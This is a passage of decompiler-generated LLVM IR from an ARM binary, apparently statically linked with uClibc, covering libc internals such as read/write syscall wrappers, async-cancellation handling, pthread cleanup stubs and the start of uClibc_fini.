  %v5_158e0 = or i32 %v3_158e0, %v4_158e0
  %v8_158e0 = and i32 %v5_158e0, %v1_158e0
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_158c0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_15890, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1589c, { 1, 0 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_158f4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_158f4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_158f4 = load i32, i32* @r0, align 4
  ret i32 %v2_158f4

bb1:                                              ; preds = %entry
  %v0_158f8 = call i32 @__syscall_error()
  ret i32 %v0_158f8
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15904 = load i32, i32* @global_var_261f4.542, align 4
  %v2_15908 = icmp eq i32 %v3_15904, 0
  store i1 %v2_15908, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15908, label %dec_label_pc_15910, label %entry.dec_label_pc_1592c_crit_edge

entry.dec_label_pc_1592c_crit_edge:               ; preds = %entry
  %v3_1592c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1592c

dec_label_pc_15910:                               ; preds = %entry
  %v0_15920 = load i32, i32* @r0, align 4
  %v2_15920 = icmp ugt i32 %v0_15920, -4097
  %v7_15920 = icmp eq i32 %v0_15920, -4096
  store i1 %v7_15920, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15920, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_1592c, %dec_label_pc_15910
  %merge = phi i32 [ %v0_15920, %dec_label_pc_15910 ], [ %v0_15950, %dec_label_pc_1592c ], [ %v0_15960, %bb10 ], [ 0, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_15910
  %v0_15928 = call i32 @__syscall_error()
  br label %dec_label_pc_1592c

dec_label_pc_1592c:                               ; preds = %entry.dec_label_pc_1592c_crit_edge, %bb9
  %v3_1592c = phi i32 [ %v3_1592c.pre, %entry.dec_label_pc_1592c_crit_edge ], [ %v0_15928, %bb9 ]
  %v12_1592c = load i32, i32* @r3, align 4
  %v15_1592c = load i32, i32* @r7, align 4
  store i32 %v15_1592c, i32* %stack_var_-8, align 4
  %v18_1592c = load i32, i32* @lr, align 4
  %v0_15930 = call i32 @__libc_enable_asynccancel()
  store i32 %v12_1592c, i32* @r3, align 4
  store i32 %v3_1592c, i32* @r7, align 4
  %v1_1594c = call i32 @__libc_disable_asynccancel(i32 %v0_15930)
  %v0_15950 = load i32, i32* @r7, align 4
  store i32 %v0_15950, i32* @r0, align 4
  %v2_15954 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15954, i32* @r7, align 4
  store i32 %v18_1592c, i32* @lr, align 4
  %v2_15958 = icmp ugt i32 %v0_15950, -4097
  %v7_15958 = icmp eq i32 %v0_15950, -4096
  store i1 %v7_15958, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15958, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_1592c
  %v0_15960 = call i32 @__syscall_error()
  %v0_15970 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_15970, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_15950, { 0, 2, 3, 1 }
  uselistorder i32 %v0_15920, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1592c, { 1, 0 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_15984 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_15984, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_15984 = load i32, i32* @r0, align 4
  ret i32 %v2_15984

bb1:                                              ; preds = %entry
  %v0_15988 = call i32 @__syscall_error()
  ret i32 %v0_15988

; uselistorder directives
  uselistorder i1* @cpsr_c, { 1, 2, 3, 4, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15994 = load i32, i32* @global_var_261f4.542, align 4
  %v2_15998 = icmp eq i32 %v3_15994, 0
  br i1 %v2_15998, label %dec_label_pc_159a0, label %entry.dec_label_pc_159bc_crit_edge

entry.dec_label_pc_159bc_crit_edge:               ; preds = %entry
  %v3_159bc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_159bc

dec_label_pc_159a0:                               ; preds = %entry
  %v0_159b0 = load i32, i32* @r0, align 4
  %v2_159b0 = icmp ugt i32 %v0_159b0, -4097
  br i1 %v2_159b0, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_159bc, %dec_label_pc_159a0
  %merge = phi i32 [ %v0_159b0, %dec_label_pc_159a0 ], [ %v0_159e0, %dec_label_pc_159bc ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_159a0
  %v0_159b8 = call i32 @__syscall_error()
  br label %dec_label_pc_159bc

dec_label_pc_159bc:                               ; preds = %entry.dec_label_pc_159bc_crit_edge, %bb8
  %v3_159bc = phi i32 [ %v3_159bc.pre, %entry.dec_label_pc_159bc_crit_edge ], [ %v0_159b8, %bb8 ]
  %v6_159bc = load i32, i32* @r1, align 4
  %v15_159bc = load i32, i32* @r7, align 4
  store i32 %v15_159bc, i32* %stack_var_-8, align 4
  %v18_159bc = load i32, i32* @lr, align 4
  %v0_159c0 = call i32 @__libc_enable_asynccancel()
  store i32 %v6_159bc, i32* @r1, align 4
  store i32 %v3_159bc, i32* @r7, align 4
  %v1_159dc = call i32 @__libc_disable_asynccancel(i32 %v0_159c0)
  %v0_159e0 = load i32, i32* @r7, align 4
  store i32 %v0_159e0, i32* @r0, align 4
  %v2_159e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_159e4, i32* @r7, align 4
  store i32 %v18_159bc, i32* @lr, align 4
  %v2_159e8 = icmp ugt i32 %v0_159e0, -4097
  br i1 %v2_159e8, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_159bc
  %v0_159f0 = call i32 @__syscall_error()
  ret i32 %v0_159f0

; uselistorder directives
  uselistorder i32 %v0_159e0, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 5, 4, 11, 7, 6, 10, 1, 0, 9, 3, 2, 8 }
  uselistorder label %dec_label_pc_159bc, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_15a00 = load i32, i32* %r0.global-to-local, align 4
  %v1_15a00 = and i32 %v0_15a00, 2
  %v2_15a00 = icmp eq i32 %v1_15a00, 0
  %v3_15a04 = load i32, i32* @r4, align 4
  store i32 %v3_15a04, i32* %stack_var_-16, align 4
  br i1 %v2_15a00, label %dec_label_pc_15a0c, label %dec_label_pc_15a80

dec_label_pc_15a0c:                               ; preds = %entry
  %v0_15a0c = call i32 @__aeabi_read_tp()
  store i32 %v0_15a0c, i32* %r0.global-to-local, align 4
  %v1_15a10 = add i32 %v0_15a0c, -1036
  %v2_15a10 = inttoptr i32 %v1_15a10 to i32*
  %v3_15a10 = load i32, i32* %v2_15a10, align 4
  %v1_15a14 = add i32 %v0_15a0c, -1168
  store i32 %v1_15a14, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15a18

dec_label_pc_15a18:                               ; preds = %dec_label_pc_15a4c.dec_label_pc_15a18_crit_edge, %dec_label_pc_15a0c
  %v0_15a24 = phi i32 [ %v0_15a24.pre, %dec_label_pc_15a4c.dec_label_pc_15a18_crit_edge ], [ %v1_15a14, %dec_label_pc_15a0c ]
  %v0_15a18 = phi i32 [ %v0_15a4c, %dec_label_pc_15a4c.dec_label_pc_15a18_crit_edge ], [ %v3_15a10, %dec_label_pc_15a0c ]
  %v1_15a18 = and i32 %v0_15a18, -3
  store i32 %v1_15a18, i32* %r7.global-to-local, align 4
  store i32 %v0_15a18, i32* %r4.global-to-local, align 4
  store i32 %v1_15a18, i32* @r1, align 4
  %v1_15a24 = add i32 %v0_15a24, 132
  store i32 %v1_15a24, i32* @r2, align 4
  %v1_15a2823 = inttoptr i32 %v1_15a24 to i32*
  %v2_15a2824 = load i32, i32* %v1_15a2823, align 4
  %v3_15a2c26 = icmp uge i32 %v2_15a2824, %v0_15a18
  store i1 %v3_15a2c26, i1* %cpsr_c.global-to-local, align 1
  %v9_15a2c32 = icmp eq i32 %v2_15a2824, %v0_15a18
  br i1 %v9_15a2c32, label %dec_label_pc_15a34, label %dec_label_pc_15a4c

dec_label_pc_15a34:                               ; preds = %dec_label_pc_15a18, %dec_label_pc_15a34.dec_label_pc_15a28_crit_edge
  %v0_15a3433 = phi i32 [ %v1_15a2c.pre, %dec_label_pc_15a34.dec_label_pc_15a28_crit_edge ], [ %v0_15a18, %dec_label_pc_15a18 ]
  store i32 %v0_15a3433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15a44 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15a44, label %dec_label_pc_15a48, label %dec_label_pc_15a34.dec_label_pc_15a28_crit_edge

dec_label_pc_15a34.dec_label_pc_15a28_crit_edge:  ; preds = %dec_label_pc_15a34
  %v0_15a28.pre = load i32, i32* @r2, align 4
  %v1_15a2c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15a28 = inttoptr i32 %v0_15a28.pre to i32*
  %v2_15a28 = load i32, i32* %v1_15a28, align 4
  %v3_15a2c = icmp uge i32 %v2_15a28, %v1_15a2c.pre
  store i1 %v3_15a2c, i1* %cpsr_c.global-to-local, align 1
  %v9_15a2c = icmp eq i32 %v2_15a28, %v1_15a2c.pre
  br i1 %v9_15a2c, label %dec_label_pc_15a34, label %dec_label_pc_15a4c

dec_label_pc_15a48:                               ; preds = %dec_label_pc_15a34
  %v0_15a48 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15a4c

dec_label_pc_15a4c:                               ; preds = %dec_label_pc_15a18, %dec_label_pc_15a34.dec_label_pc_15a28_crit_edge, %dec_label_pc_15a48
  %v0_15a4c = phi i32 [ %v0_15a48, %dec_label_pc_15a48 ], [ %v2_15a2824, %dec_label_pc_15a18 ], [ %v2_15a28, %dec_label_pc_15a34.dec_label_pc_15a28_crit_edge ]
  %v1_15a4c = phi i32 [ %v0_15a48, %dec_label_pc_15a48 ], [ %v0_15a18, %dec_label_pc_15a18 ], [ %v1_15a2c.pre, %dec_label_pc_15a34.dec_label_pc_15a28_crit_edge ]
  %v3_15a4c = icmp uge i32 %v0_15a4c, %v1_15a4c
  store i1 %v3_15a4c, i1* %cpsr_c.global-to-local, align 1
  %v9_15a4c = icmp eq i32 %v0_15a4c, %v1_15a4c
  br i1 %v9_15a4c, label %dec_label_pc_15a74.preheader, label %dec_label_pc_15a4c.dec_label_pc_15a18_crit_edge

dec_label_pc_15a4c.dec_label_pc_15a18_crit_edge:  ; preds = %dec_label_pc_15a4c
  %v0_15a24.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15a18

dec_label_pc_15a74.preheader:                     ; preds = %dec_label_pc_15a4c
  %v0_15a741 = load i32, i32* %r7.global-to-local, align 4
  %v1_15a742 = and i32 %v0_15a741, 12
  store i32 %v1_15a742, i32* @r3, align 4
  %v2_15a783 = icmp ugt i32 %v1_15a742, 3
  store i1 %v2_15a783, i1* %cpsr_c.global-to-local, align 1
  %v7_15a785 = icmp eq i32 %v1_15a742, 4
  br i1 %v7_15a785, label %dec_label_pc_15a58.lr.ph, label %dec_label_pc_15a74.preheader.dec_label_pc_15a80.loopexit_crit_edge

dec_label_pc_15a74.preheader.dec_label_pc_15a80.loopexit_crit_edge: ; preds = %dec_label_pc_15a74.preheader
  %v1_15a84.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15a80.loopexit

dec_label_pc_15a58.lr.ph:                         ; preds = %dec_label_pc_15a74.preheader
  %v0_15a5c.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_15a5c = add i32 %v0_15a5c.pre, 132
  %v2_15a70 = inttoptr i32 %v1_15a5c to i32*
  br label %dec_label_pc_15a58

dec_label_pc_15a58:                               ; preds = %dec_label_pc_15a58.lr.ph, %dec_label_pc_15a58
  %v0_15a58 = phi i32 [ %v0_15a741, %dec_label_pc_15a58.lr.ph ], [ %v3_15a70, %dec_label_pc_15a58 ]
  store i32 %v0_15a58, i32* @r2, align 4
  store i32 %v1_15a5c, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_15a70 = load i32, i32* %v2_15a70, align 4
  store i32 %v3_15a70, i32* %r7.global-to-local, align 4
  %v1_15a74 = and i32 %v3_15a70, 12
  store i32 %v1_15a74, i32* @r3, align 4
  %v7_15a78 = icmp eq i32 %v1_15a74, 4
  br i1 %v7_15a78, label %dec_label_pc_15a58, label %dec_label_pc_15a74.dec_label_pc_15a80.loopexit_crit_edge

dec_label_pc_15a74.dec_label_pc_15a80.loopexit_crit_edge: ; preds = %dec_label_pc_15a58
  %v2_15a78 = icmp ugt i32 %v1_15a74, 3
  store i1 %v2_15a78, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_15a80.loopexit

dec_label_pc_15a80.loopexit:                      ; preds = %dec_label_pc_15a74.preheader.dec_label_pc_15a80.loopexit_crit_edge, %dec_label_pc_15a74.dec_label_pc_15a80.loopexit_crit_edge
  %v1_15a84.pre = phi i32 [ %v1_15a84.pre.pre, %dec_label_pc_15a74.preheader.dec_label_pc_15a80.loopexit_crit_edge ], [ %v1_15a5c, %dec_label_pc_15a74.dec_label_pc_15a80.loopexit_crit_edge ]
  %v2_15a80.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_15a80

dec_label_pc_15a80:                               ; preds = %dec_label_pc_15a80.loopexit, %entry
  %v1_15a84 = phi i32 [ %v1_15a84.pre, %dec_label_pc_15a80.loopexit ], [ %v0_15a00, %entry ]
  %v2_15a80 = phi i32 [ %v2_15a80.pre, %dec_label_pc_15a80.loopexit ], [ %v3_15a04, %entry ]
  store i32 %v2_15a80, i32* @r4, align 4
  ret i32 %v1_15a84

; uselistorder directives
  uselistorder i32 %v3_15a70, { 1, 2, 0 }
  uselistorder i32 %v1_15a5c, { 0, 2, 1 }
  uselistorder i32 %v0_15a48, { 1, 0 }
  uselistorder i32 %v1_15a2c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15a18, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 1, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_15a80.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_15a58, { 1, 0 }
  uselistorder label %dec_label_pc_15a4c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15a34, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_15a88 = load i32, i32* @r4, align 4
  store i32 %v3_15a88, i32* %stack_var_-24, align 4
  store i32 54636, i32* %r8.global-to-local, align 4
  %v0_15a90 = call i32 @__aeabi_read_tp()
  %v1_15a94 = add i32 %v0_15a90, -1036
  %v2_15a94 = inttoptr i32 %v1_15a94 to i32*
  %v3_15a94 = load i32, i32* %v2_15a94, align 4
  store i32 %v3_15a94, i32* %r6.global-to-local, align 4
  %v1_15a98 = add i32 %v0_15a90, -1168
  store i32 %v1_15a98, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r8.global-to-local, align 4
  %v1_15aa046 = or i32 %v3_15a94, 2
  store i32 %v1_15aa046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15aa449 = icmp eq i32 %v1_15aa046, %v3_15a94
  br i1 %v9_15aa449, label %dec_label_pc_15b50, label %dec_label_pc_15aac

dec_label_pc_15aac:                               ; preds = %entry, %bb.dec_label_pc_15aac_crit_edge
  %v0_15ab0 = phi i32 [ %v0_15ab0.pre, %bb.dec_label_pc_15aac_crit_edge ], [ %v1_15a98, %entry ]
  %v1_15aa051 = phi i32 [ %v1_15aa0, %bb.dec_label_pc_15aac_crit_edge ], [ %v1_15aa046, %entry ]
  %v0_15ab450 = phi i32 [ %v1_15ae0, %bb.dec_label_pc_15aac_crit_edge ], [ %v3_15a94, %entry ]
  store i32 %v1_15aa051, i32* @r1, align 4
  %v1_15ab0 = add i32 %v0_15ab0, 132
  store i32 %v1_15ab0, i32* @r2, align 4
  store i32 %v0_15ab450, i32* %r4.global-to-local, align 4
  %v1_15ab834 = inttoptr i32 %v1_15ab0 to i32*
  %v2_15ab835 = load i32, i32* %v1_15ab834, align 4
  store i32 %v2_15ab835, i32* @r3, align 4
  %v3_15abc37 = icmp uge i32 %v2_15ab835, %v0_15ab450
  store i1 %v3_15abc37, i1* %cpsr_c.global-to-local, align 1
  %v9_15abc43 = icmp eq i32 %v2_15ab835, %v0_15ab450
  br i1 %v9_15abc43, label %dec_label_pc_15ac4, label %dec_label_pc_15adc

dec_label_pc_15ac4:                               ; preds = %dec_label_pc_15aac, %dec_label_pc_15ac4.dec_label_pc_15ab8_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_15ad4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15ad4, label %dec_label_pc_15ad8, label %dec_label_pc_15ac4.dec_label_pc_15ab8_crit_edge

dec_label_pc_15ac4.dec_label_pc_15ab8_crit_edge:  ; preds = %dec_label_pc_15ac4
  %v0_15ab8.pre = load i32, i32* @r2, align 4
  %v1_15abc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15ab8 = inttoptr i32 %v0_15ab8.pre to i32*
  %v2_15ab8 = load i32, i32* %v1_15ab8, align 4
  store i32 %v2_15ab8, i32* @r3, align 4
  %v3_15abc = icmp uge i32 %v2_15ab8, %v1_15abc.pre
  store i1 %v3_15abc, i1* %cpsr_c.global-to-local, align 1
  %v9_15abc = icmp eq i32 %v2_15ab8, %v1_15abc.pre
  br i1 %v9_15abc, label %dec_label_pc_15ac4, label %dec_label_pc_15adc

dec_label_pc_15ad8:                               ; preds = %dec_label_pc_15ac4
  %v0_15ad8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15ad8, i32* @r3, align 4
  br label %dec_label_pc_15adc

dec_label_pc_15adc:                               ; preds = %dec_label_pc_15aac, %dec_label_pc_15ac4.dec_label_pc_15ab8_crit_edge, %dec_label_pc_15ad8
  %v1_15ae0 = phi i32 [ %v0_15ad8, %dec_label_pc_15ad8 ], [ %v2_15ab835, %dec_label_pc_15aac ], [ %v2_15ab8, %dec_label_pc_15ac4.dec_label_pc_15ab8_crit_edge ]
  %v1_15adc = load i32, i32* %r6.global-to-local, align 4
  %v3_15adc = icmp uge i32 %v1_15ae0, %v1_15adc
  store i1 %v3_15adc, i1* %cpsr_c.global-to-local, align 1
  %v9_15adc = icmp eq i32 %v1_15ae0, %v1_15adc
  br i1 %v9_15adc, label %dec_label_pc_15ae8, label %bb

bb:                                               ; preds = %dec_label_pc_15adc
  store i32 %v1_15ae0, i32* %r6.global-to-local, align 4
  %v1_15aa0 = or i32 %v1_15ae0, 2
  store i32 %v1_15aa0, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15aa4 = icmp eq i32 %v1_15aa0, %v1_15ae0
  br i1 %v9_15aa4, label %dec_label_pc_15b50, label %bb.dec_label_pc_15aac_crit_edge

bb.dec_label_pc_15aac_crit_edge:                  ; preds = %bb
  %v0_15ab0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15aac

dec_label_pc_15ae8:                               ; preds = %dec_label_pc_15adc
  %v0_15ae8 = load i32, i32* %r5.global-to-local, align 4
  %v1_15ae8 = and i32 %v0_15ae8, -69
  store i32 %v1_15ae8, i32* @r3, align 4
  %v2_15aec = icmp ugt i32 %v1_15ae8, 9
  store i1 %v2_15aec, i1* %cpsr_c.global-to-local, align 1
  %v7_15aec = icmp eq i32 %v1_15ae8, 10
  br i1 %v7_15aec, label %dec_label_pc_15af4, label %dec_label_pc_15b50

dec_label_pc_15af4:                               ; preds = %dec_label_pc_15ae8
  %v1_15af8 = load i32, i32* %r7.global-to-local, align 4
  %v2_15af8 = add i32 %v1_15af8, 544
  %v3_15af8 = inttoptr i32 %v2_15af8 to i32*
  store i32 -1, i32* %v3_15af8, align 4
  %v0_15afc = load i32, i32* @r2, align 4
  store i32 %v0_15afc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15b00

dec_label_pc_15b00:                               ; preds = %dec_label_pc_15b34.dec_label_pc_15b00_crit_edge, %dec_label_pc_15af4
  %v0_15b04 = phi i32 [ %v0_15b04.pre, %dec_label_pc_15b34.dec_label_pc_15b00_crit_edge ], [ %v0_15afc, %dec_label_pc_15af4 ]
  %v0_15b00 = load i32, i32* %r7.global-to-local, align 4
  %v1_15b00 = add i32 %v0_15b00, 132
  %v2_15b00 = inttoptr i32 %v1_15b00 to i32*
  %v3_15b00 = load i32, i32* %v2_15b00, align 4
  store i32 %v0_15b04, i32* @r2, align 4
  store i32 %v3_15b00, i32* %r4.global-to-local, align 4
  %v1_15b0c = or i32 %v3_15b00, 16
  store i32 %v1_15b0c, i32* @r1, align 4
  %v1_15b1022 = inttoptr i32 %v0_15b04 to i32*
  %v2_15b1023 = load i32, i32* %v1_15b1022, align 4
  %v3_15b1425 = icmp uge i32 %v2_15b1023, %v3_15b00
  store i1 %v3_15b1425, i1* %cpsr_c.global-to-local, align 1
  %v9_15b1431 = icmp eq i32 %v2_15b1023, %v3_15b00
  br i1 %v9_15b1431, label %dec_label_pc_15b1c, label %dec_label_pc_15b34

dec_label_pc_15b1c:                               ; preds = %dec_label_pc_15b00, %dec_label_pc_15b1c.dec_label_pc_15b10_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_15b2c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15b2c, label %dec_label_pc_15b30, label %dec_label_pc_15b1c.dec_label_pc_15b10_crit_edge

dec_label_pc_15b1c.dec_label_pc_15b10_crit_edge:  ; preds = %dec_label_pc_15b1c
  %v0_15b10.pre = load i32, i32* @r2, align 4
  %v1_15b14.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15b10 = inttoptr i32 %v0_15b10.pre to i32*
  %v2_15b10 = load i32, i32* %v1_15b10, align 4
  %v3_15b14 = icmp uge i32 %v2_15b10, %v1_15b14.pre
  store i1 %v3_15b14, i1* %cpsr_c.global-to-local, align 1
  %v9_15b14 = icmp eq i32 %v2_15b10, %v1_15b14.pre
  br i1 %v9_15b14, label %dec_label_pc_15b1c, label %dec_label_pc_15b34

dec_label_pc_15b30:                               ; preds = %dec_label_pc_15b1c
  %v0_15b30 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15b34

dec_label_pc_15b34:                               ; preds = %dec_label_pc_15b00, %dec_label_pc_15b1c.dec_label_pc_15b10_crit_edge, %dec_label_pc_15b30
  %v0_15b34 = phi i32 [ %v0_15b30, %dec_label_pc_15b30 ], [ %v2_15b1023, %dec_label_pc_15b00 ], [ %v2_15b10, %dec_label_pc_15b1c.dec_label_pc_15b10_crit_edge ]
  %v1_15b34 = phi i32 [ %v0_15b30, %dec_label_pc_15b30 ], [ %v3_15b00, %dec_label_pc_15b00 ], [ %v1_15b14.pre, %dec_label_pc_15b1c.dec_label_pc_15b10_crit_edge ]
  %v3_15b34 = icmp uge i32 %v0_15b34, %v1_15b34
  store i1 %v3_15b34, i1* %cpsr_c.global-to-local, align 1
  %v9_15b34 = icmp eq i32 %v0_15b34, %v1_15b34
  br i1 %v9_15b34, label %dec_label_pc_15b3c, label %dec_label_pc_15b34.dec_label_pc_15b00_crit_edge

dec_label_pc_15b34.dec_label_pc_15b00_crit_edge:  ; preds = %dec_label_pc_15b34
  %v0_15b04.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_15b00

dec_label_pc_15b3c:                               ; preds = %dec_label_pc_15b34
  store i32 116, i32* @r3, align 4
  %v0_15b44 = load i32, i32* %r8.global-to-local, align 4
  %v2_15b44 = add i32 %v0_15b44, 116
  %v3_15b44 = inttoptr i32 %v2_15b44 to i32*
  %v4_15b44 = load i32, i32* %v3_15b44, align 4
  store i32 %v4_15b44, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_15b44)
  %v0_15b50.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15b50

dec_label_pc_15b50:                               ; preds = %entry, %bb, %dec_label_pc_15ae8, %dec_label_pc_15b3c
  %v0_15b50 = phi i32 [ %v1_15ae0, %dec_label_pc_15ae8 ], [ %v0_15b50.pre, %dec_label_pc_15b3c ], [ %v3_15a94, %entry ], [ %v1_15ae0, %bb ]
  %v2_15b54 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_15b54, i32* @r4, align 4
  ret i32 %v0_15b50

; uselistorder directives
  uselistorder i32 %v0_15b30, { 1, 0 }
  uselistorder i32 %v1_15b14.pre, { 0, 2, 1 }
  uselistorder i32 %v1_15aa0, { 1, 2, 0 }
  uselistorder i32 %v1_15adc, { 1, 0 }
  uselistorder i32 %v1_15ae0, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_15abc.pre, { 1, 0 }
  uselistorder i32 %v0_15ab450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 0, 6, 10, 7, 9, 8, 1, 2 }
  uselistorder i32 116, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15b50, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_15b34, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15b1c, { 1, 0 }
  uselistorder label %dec_label_pc_15adc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15ac4, { 1, 0 }
  uselistorder label %dec_label_pc_15aac, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_15b74 = add i32 %tmp, 4
  %v4_15b74 = inttoptr i32 %v3_15b74 to i32*
  store i32 %arg3, i32* %v4_15b74, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_15b80 = icmp eq i32 %arg2, 0
  br i1 %v2_15b80, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_15b8c = add i32 %tmp, 4
  %v3_15b8c = inttoptr i32 %v2_15b8c to i32*
  %v4_15b8c = load i32, i32* %v3_15b8c, align 4
  store i32 %v4_15b8c, i32* %r0.global-to-local, align 4
  %v3_15b90 = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %.02 = phi i32 [ %v3_15b90, %bb ], [ undef, %entry ]
  %v2_15b98 = xor i1 %v2_15b80, true
  call void @__pseudo_cond_branch(i1 %v2_15b98, i32 %.02)
  %v1_15ba4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_15ba4

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_15bcc.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_15ba8 = load i32, i32* @r4, align 4
  store i32 %v3_15ba8, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_23010.367 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_23010.367 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15bcc

dec_label_pc_15bcc:                               ; preds = %dec_label_pc_15bcc.dec_label_pc_15bcc_crit_edge, %dec_label_pc_15bcc.lr.ph
